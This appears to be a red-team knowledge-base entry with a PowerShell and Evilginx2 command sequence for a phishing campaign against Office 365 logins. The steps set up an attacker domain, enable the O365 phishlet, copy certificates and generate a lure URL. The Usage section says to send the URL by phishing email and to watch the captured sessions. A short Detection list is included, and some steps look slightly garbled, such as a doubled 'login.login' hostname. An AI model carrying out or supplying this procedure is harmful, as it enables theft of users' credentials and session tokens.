---
id: 01350f88-e9dd-4125-8fd8-a7f147946654
name: Evilginx2-Azure-Phishlet-Setup-Script
type: code
language: powershell
verified: true
created_at: '2023-05-24T03:35:02.203400+00:00'
updated_at: '2023-05-24T03:35:02.315685+00:00'
platforms:
  - Windows
tags:
  - phishing
  - setup
  - evilginx2
  - azure
validated: true
---

# Evilginx2-Azure-Phishlet-Setup-Script

## Code

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets

# Configure Domain and IP
: config domain username.corp
: config ip 10.10.10.10

# Configure O365 Phishlet
: phishlets hostname o365 login.username.corp
: phishlets get-hosts o365

# Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key

# Enable O365 Phishlet
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```

## Description

This script outlines the complete setup for an Evilginx2 phishing campaign targeting Azure/Office 365 logins. It launches the framework, configures networking, sets up the O365 phishlet, handles certificates, enables the phishlet, and generates a lure URL. Run interactively in the Evilginx2 shell and PowerShell as indicated.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username.corp | Attacker's controlled domain | evilphish.com |
| 10.10.10.10 | Attacker's external IP | 192.168.1.100 |
| login.username.corp | Phishing subdomain | login.evilphish.com |
| C:\Users\Username\.evilginx\crt | Path to Evilginx2 cert directory | /home/user/.evilginx/crt |
| o365 | Phishlet name for Azure/O365 | azure |
| 0 | Lure ID | 1 |

## Usage

Execute step-by-step in a terminal: Start with launching Evilginx2, then run config and phishlet commands in the shell, handle certs in PowerShell, and finish with lure creation. Distribute the generated URL via phishing email. Monitor captured sessions with `: sessions` in Evilginx2.

## Detection

- Network logs showing traffic to suspicious subdomains (e.g., login.[attacker-domain]).
- Azure AD sign-ins from unknown IPs or with mismatched user agents.
- Certificate pinning failures or self-signed cert warnings (if not properly copied).
- Email filters detecting lure links; monitor for Evilginx2 binaries or unusual proxy traffic.

## Related

- [[procedures/Azure-Phishing-with-Evilginx2]]
- [[tools/Evilginx2]]
